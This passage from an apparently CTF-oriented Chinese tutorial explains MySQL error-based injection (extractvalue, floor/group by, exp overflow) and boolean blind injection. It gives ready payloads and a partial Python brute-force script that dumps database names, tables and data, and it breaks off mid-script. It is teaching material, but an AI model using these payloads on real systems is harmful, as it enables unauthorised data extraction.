<h4 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h4><p>其实和updatexml函数没什么区别，但是</p>
<p><strong>Extractvalue()函数：</strong></p>
<ul>
<li>主要用于从XML数据中查询并返回包含指定XPath字符串的字符串。</li>
<li>适用于从XML数据中提取特定信息的场景。</li>
<li>在数据查询和数据解析方面发挥着重要作用。</li>
</ul>
<p>语法：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">extractvalue</span>(xml_document,Xpath_string);</span><br></pre></td></tr></table></figure>

<p>第一个参数：xml_document是string格式，为xml文档对象的名称</p>
<p>第二个参数：Xpath_string是xpath格式的字符串</p>
<p>作用：从目标xml中返回包含所查询值的字符串</p>
<p>payload</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(<span class="number">1</span>,(<span class="name">concat</span>(<span class="number">0</span>x7e,(<span class="name">payload</span>))))</span><br></pre></td></tr></table></figure>

<p>注入过程</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名:id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(database(</span>)))))#</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">爆表名:id</span>=<span class="number">1&#x27;</span><span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database()))))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">爆字段名:id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;表名&#x27;</span>))))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">爆数据:id=<span class="number">1&#x27;</span> <span class="keyword">and</span>(<span class="function"><span class="keyword">select</span> <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(字段名</span>) <span class="keyword">from</span> 数据库名.表名)))#</span></span><br></pre></td></tr></table></figure>

<p>extractvalue()能查询字符串的最大长度为32，就是说如果结果可能会超过32，就需要用substring()等函数或者limit语句去截取，这个函数在盲注中有介绍，可以跳转一下</p>
<h3 id="group-by报错"><a href="#group-by报错" class="headerlink" title="group by报错"></a>group by报错</h3><h4 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h4><p>floor()函数</p>
<ul>
<li><strong>功能</strong>：向下取整，返回小于或等于指定数值的最大整数。</li>
<li><strong>特点</strong>：无论是正数还是负数，<code>FLOOR()</code> 函数都会向“数轴下方”取整。</li>
<li><strong>适用场景</strong>：用于数据处理，比如去掉小数部分，或对计算结果进行取整处理。</li>
</ul>
<p>rand() 是一个用于生成 <strong>随机数</strong> 的函数</p>
<ul>
<li><strong>功能</strong>：生成一个 <strong>0 到 1 之间的随机浮点数</strong>（范围：[0, 1)），结果包含 0，但不包含 1。</li>
</ul>
<p>floor(rand(0)<em>2) 产生的随机数的*<em>前六位</em></em> 一定是 “011011”</p>
<p>然后我们看看报错注入的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));</span><br><span class="line">2、select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507171245178.png" alt="image-20250507171245178"></p>
<p>可以看到这里的库名是被爆出来了，但是为什么第二种payload有时候会爆不出来呢</p>
<p>首先我们要知道这里floor结合group by报错注入的原理和过程</p>
<p>这里的话通过concat函数将数据库名和floor函数的结果相连，这里的结果就是</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">database</span><span class="params">()</span></span>+<span class="string">&#x27;0&#x27;</span>和<span class="built_in">database</span>()+<span class="string">&#x27;1&#x27;</span>两种结果</span><br></pre></td></tr></table></figure>

<p>因为上面我们知道，floor(rand(0)<em>2) 产生的随机数的*<em>前六位</em></em> 一定是 “011011”</p>
<p>所以前六个结果一定是</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;database()+&#x27;<span class="number">0</span>&#x27;&#x27;</span><br><span class="line">&#x27;database()+&#x27;<span class="number">1</span>&#x27;&#x27;</span><br><span class="line">&#x27;database()+&#x27;<span class="number">1</span>&#x27;&#x27;</span><br><span class="line">&#x27;database()+&#x27;<span class="number">0</span>&#x27;&#x27;</span><br><span class="line">&#x27;database()+&#x27;<span class="number">1</span>&#x27;&#x27;</span><br><span class="line">&#x27;database()+&#x27;<span class="number">1</span>&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>报错注入的原理：</p>
<p>我看到一个师傅的解释挺好的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html</a></p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507172447811.png" alt="image-20250507172447811"></p>
<p>其实就是通过虚拟表的创建和插入去造成报错返回数据</p>
<p>注入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆库名：</span><br><span class="line">id=1&#x27;union select count(*),2,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2))as a from information_schema.tables group by a#</span><br><span class="line">爆表名：</span><br><span class="line">id=1&#x27; union select count(*),2,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database()),&#x27;~&#x27;,floor(rand()*2))as a from information_schema.tables group by a#</span><br><span class="line">爆列名：</span><br><span class="line">id=1&#x27; union select count(*),2,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;表名&#x27;),&#x27;~&#x27;,floor(rand()*2))as a from information_schema.tables group by a#</span><br><span class="line">爆字段：</span><br><span class="line">id=1&#x27; union select count(*),2,concat(&#x27;~&#x27;,(select group_concat(列名)from 数据库名.表名),&#x27;~&#x27;,floor(rand()*2))as a from information_schema.tables group by a#</span><br></pre></td></tr></table></figure>

<p>使用floor报错注入，需要确保查询的表必须大于三条数据</p>
<p>除了floor函数，其他的几个函数也能用</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ceil</span>()-向上取整函数</span><br><span class="line"><span class="built_in">ceil</span>(x) 返回不小于 <span class="attribute">x</span> 的最小整数，即向上取整。</span><br><span class="line">例如，<span class="built_in">ceil</span>(<span class="number">3.14</span>) 返回 <span class="number">4</span>。</span><br><span class="line"></span><br><span class="line"><span class="built_in">round</span>() - 四舍五入函数</span><br><span class="line"><span class="built_in">round</span>(x) 返回最接近 <span class="attribute">x</span> 的整数，如果有两个整数与 <span class="attribute">x</span> 距离相等，则返回偶数的整数。</span><br><span class="line">例如，<span class="built_in">round</span>(<span class="number">3.6</span>) 返回 <span class="number">4</span>，<span class="built_in">round</span>(<span class="number">3.5</span>) 返回 <span class="number">4</span>，<span class="built_in">round</span>(<span class="number">3.4</span>) 返回 <span class="number">3</span>。</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库名：</span><br><span class="line">id=<span class="number">1</span>&#x27;<span class="built_in">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(*),<span class="number">2</span>,concat(&#x27;~&#x27;,(<span class="keyword">select</span> database()),&#x27;~&#x27;,ceil(<span class="built_in">rand</span>()*<span class="number">2</span>))as a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a#</span><br><span class="line">爆库名：</span><br><span class="line">id=<span class="number">1</span>&#x27;<span class="built_in">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(*),<span class="number">2</span>,concat(&#x27;~&#x27;,(<span class="keyword">select</span> database()),&#x27;~&#x27;,round(<span class="built_in">rand</span>()*<span class="number">2</span>))as a <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> a#</span><br></pre></td></tr></table></figure>



<h3 id="数溢出报错"><a href="#数溢出报错" class="headerlink" title="数溢出报错"></a>数溢出报错</h3><h4 id="exp-报错注入"><a href="#exp-报错注入" class="headerlink" title="exp()报错注入"></a>exp()报错注入</h4><p><code>EXP()</code> 是一个数学函数，它用来计算 <strong>自然指数函数（e^x）</strong> 的值</p>
<ul>
<li>EXP(x) &#x3D; e^x</li>
</ul>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250121163822411.png" alt="image-20250121163822411"></p>
<p>那这个注入的原理是什么呢？</p>
<p>SQL语句中，函数成功执行后返回0，将0按位取反后会得到<strong>18446744073709551615</strong>（最大的无符号值），如果对这个值进行数值表达式运算则会导致溢出错误。</p>
<p>payload</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(~(payload))</span><br></pre></td></tr></table></figure>

<p>注入过程</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">database</span>())x))#</span><br><span class="line">爆表名：</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x))#</span><br><span class="line">爆列名：</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x))#</span><br><span class="line">爆字段：</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> 列名 <span class="keyword">from</span> 数据库名.表名)))#</span><br></pre></td></tr></table></figure>

<p>但是数溢出报错只有在mysql&gt;5.5以上的版本才会产生溢出错误信息，以下的版本对于溢出不会发送任何信息</p>
<h2 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h2><p>进行布尔盲注的条件是页面会有回显作为语句执行是否成功的标志，一般我们可以先用永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注</p>
<p>什么情况下考虑使用布尔盲注？</p>
<ul>
<li><p>该输入框存在注入点。</p>
</li>
<li><p>该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。</p>
</li>
<li><p>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</p>
</li>
</ul>
<p>基本函数</p>
<ul>
<li>ascii()函数:<code>ASCII()</code> 函数用于返回字符串中第一个字符的 ASCII 值。如果字符串为空，返回值为 0。</li>
</ul>
<h3 id="ASCII替换函数"><a href="#ASCII替换函数" class="headerlink" title="ASCII替换函数"></a>ASCII替换函数</h3><p>ord()函数：ORD() 函数返回字符串第一个字符的ASCII 值，如果该字符是一个多字节（即一个或多个字节的序列），则MySQL函数将返回最左边字符的代码。</p>
<p>当然如果两个ascii函数被禁用了的话也可以直接不用这些转ASCII函数，而是直接进行字符集匹配</p>
<h3 id="substr替换函数"><a href="#substr替换函数" class="headerlink" title="substr替换函数"></a>substr替换函数</h3><p>substr()函数:SUBSTR()函数（在某些数据库中也称为 SUBSTRING()）用于从一个字符串中提取子字符串。</p>
<h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p>在 MySQL 中，<code>LEFT()</code> 函数用于从字符串的左侧提取指定数量的字符</p>
<p>语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">LEFT</span><span class="params">(string, length)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>string</code>**：要提取字符的字符串。</li>
<li>**<code>length</code>**：要提取的字符数量。</li>
</ul>
<h3 id="right-函数"><a href="#right-函数" class="headerlink" title="right()函数"></a>right()函数</h3><p>在 MySQL 中，<code>RIGHT()</code> 函数用于从字符串的右侧提取指定数量的字符。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">RIGHT</span>(<span class="keyword">string</span>, <span class="built_in">length</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>string</code>**：要提取字符的字符串。</li>
<li>**<code>length</code>**：要提取的字符数量。</li>
</ul>
<h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>在 MySQL 中，<code>MID()</code> 函数用于从字符串的指定位置开始提取指定数量的字符。</p>
<p>语法</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(<span class="keyword">string</span>, <span class="built_in">start</span>, <span class="built_in">length</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>string</code>**：要提取字符的字符串。</li>
<li>**<code>start</code>**：开始提取的位置（从 1 开始计数）。</li>
<li>**<code>length</code>**：要提取的字符数量（可选，如果省略，则提取从 <code>start</code> 到字符串末尾的所有字符）。</li>
</ul>
<h3 id="substring-函数"><a href="#substring-函数" class="headerlink" title="substring()函数"></a>substring()函数</h3><p>在 MySQL 中，<code>SUBSTRING()</code> 函数用于从字符串的指定位置开始提取指定数量的字符。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(<span class="keyword">string</span>, <span class="built_in">start</span>, <span class="built_in">length</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>string</code>**：要提取字符的字符串。</li>
<li>**<code>start</code>**：开始提取的位置（从 1 开始计数）。</li>
<li>**<code>length</code>**：要提取的字符数量（可选，如果省略，则提取从 <code>start</code> 到字符串末尾的所有字符）。</li>
</ul>
<p>​	lpad（str，len，padstr）</p>
<p>​	rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果</p>
<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p><strong>1. 判断是否存在注入以及注入类型</strong></p>
<p><strong>2. 构造sql语句，利用length()函数得到数据库长度：</strong>1 and(length(database()))&gt;x根据回显是否正常来判断数据库长度</p>
<p><strong>3. 猜测数据库名字，利用ascii()函数和substr()函数依次得到数据库的名字，例如：</strong>1 and (ascii(substr(database(),y,1)))&gt;x，根据每个字母的ascii值找出数据库的第y个字母</p>
<p>**4. 判断表的数量,例如:**1 and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;x来判断表的数量</p>
<p>**5. 猜测表名:**1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit x,1),y,1))&gt;x 来猜测第x张表的第y个字母</p>
<p>**6. 猜测字段数量:**1 and (select count(column_name) from information_schema.columns where table_name&#x3D;’表名’)&#x3D;1</p>
<p>**7. 猜测数据内容:**1 and ascii(substr((select * from 数据库.表名 where id&#x3D;1),1,1))&gt;x</p>
<p>手工盲注比较繁琐，一般都会用脚本去注入或者用工具sqlmap</p>
<p>布尔盲注的脚本我贴一个最基础的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#GET请求的布尔盲注</span></span><br><span class="line">    <span class="comment">#爆破数据库的长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_length</span>(<span class="params">url, headers</span>):</span><br><span class="line">    databaselen = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        databaselen_payload = <span class="string">f&quot;?id=1&#x27; and length(database())=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + databaselen_payload, headers=headers)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            databaselen = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字长度为:  &#x27;</span>+ <span class="built_in">str</span>(databaselen))</span><br><span class="line">    <span class="keyword">return</span> databaselen</span><br><span class="line"></span><br><span class="line">    <span class="comment">#爆破数据库的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_name</span>(<span class="params">url, headers, databaselen</span>):</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span>   </span><br><span class="line">    sign = false</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):<span class="comment">#用来爆破数据库的字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            databasechar_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr(database(),<span class="subst">&#123;l&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + databasechar_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                databasename += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(databasename)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字为:  &#x27;</span>+ <span class="built_in">str</span>(databasename))</span><br><span class="line">    <span class="keyword">return</span> databasename</span><br><span class="line"> <span class="comment">#爆破表的个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_count</span>(<span class="params">url, headers, databasename</span>):</span><br><span class="line">    tablecount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):<span class="comment">#用来爆破表的个数</span></span><br><span class="line">        tablecount_payload = <span class="string">f&quot;?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;databasename&#125;</span>&#x27;) =<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + tablecount_payload, headers=headers) </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            tablecount = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;表的个数为: <span class="subst">&#123;tablecount&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> tablecount</span><br><span class="line"><span class="comment">#爆破表的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_name</span>(<span class="params">url, headers, tablecount,databasename</span>):</span><br><span class="line">    tables=[]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tablecount):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        tablelen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            tablelen_payload = <span class="string">f&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1))=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + tablelen_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                tablelen = l</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的长度为: <span class="subst">&#123;tablelen&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tablelen+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                table_name_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1),<span class="subst">&#123;m&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">                response = requests.get(url + table_name_payload, headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(table_name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的名字为: <span class="subst">&#123;table_name&#125;</span>&#x27;</span>)</span><br><span class="line">        tables.append(table_name)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#爆破字段的个数</span></span><br><span class="line"><span class="string">def brute_force_column_count(url, headers, tables):</span></span><br><span class="line"><span class="string">    column_count = 0</span></span><br><span class="line"><span class="string">    for l in range(1, 50):</span></span><br><span class="line"><span class="string">        column_countpayload = f&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;&#123;tables&#125;&#x27;)=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">        response = requests.get(url + column_countpayload, headers=headers)</span></span><br><span class="line"><span class="string">        if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">            column_count = l</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(f&#x27;表 &#123;tables&#125; 有 &#123;column_count&#125; 字段.&#x27;) </span></span><br><span class="line"><span class="string">    return column_count</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查询表中字段</span></span><br><span class="line"><span class="string">def brute_force_column_name(url, headers,tables, column_count):</span></span><br><span class="line"><span class="string">    columns = []</span></span><br><span class="line"><span class="string">    for c in range(column_count):</span></span><br><span class="line"><span class="string">        column_name = &#x27;&#x27;</span></span><br><span class="line"><span class="string">        for l in range(1, 50):</span></span><br><span class="line"><span class="string">            column_count_payload = f&quot;?id=1&#x27; and length((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1))=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">            response = requests.get(url + column_count_payload, headers=headers)</span></span><br><span class="line"><span class="string">            if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                column_count = l</span></span><br><span class="line"><span class="string">                print(f&#x27;表 &#123;tables&#125; 中字段 &#123;c+1&#125; 的个数为: &#123;column_count&#125;&#x27;)</span></span><br><span class="line"><span class="string">        for m in range(1, column_count+1):</span></span><br><span class="line"><span class="string">            for i in range(32, 128):</span></span><br><span class="line"><span class="string">                column_name_payload = f&quot;?id=1&#x27; and ascii(SUBSTR((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1),&#123;m&#125;,1))=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line"><span class="string">                response = requests.get(url + column_name_payload, headers=headers)</span></span><br><span class="line"><span class="string">                if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                    column_name += chr(i)</span></span><br><span class="line"><span class="string">                    print(column_name)</span></span><br><span class="line"><span class="string">                    break</span></span><br><span class="line"><span class="string">        print(f&#x27;表 &#123;tables&#125;  中字段 &#123;c+1&#125; 的名字为: &#123;column_name&#125;&#x27;)</span></span><br><span class="line"><span class="string">        columns.append(column_name)</span></span><br><span class="line"><span class="string">    return 